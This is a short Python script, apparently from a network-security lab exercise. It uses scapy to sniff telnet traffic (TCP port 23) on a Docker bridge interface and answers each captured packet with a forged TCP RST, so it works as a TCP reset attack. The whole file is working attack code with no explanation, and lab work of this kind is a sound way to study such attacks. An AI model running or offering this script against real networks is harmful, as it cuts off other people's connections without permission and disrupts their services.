#!/usr/bin/env python3
from scapy.all import *
def spoof_tcp(pkt):
    IPLayer = IP(dst=pkt[IP].src, src=pkt[IP].dst)
    TCPLayer = TCP(flags="R", seq=pkt[TCP].ack, dport=pkt[TCP].sport, sport=pkt[TCP].dport)
    spoofpkt = IPLayer/TCPLayer
    ls(spoofpkt)
    send(spoofpkt, verbose=0)

pkt=sniff(iface="br-d9df92208b54", filter='tcp and port 23',prn=spoof_tcp)

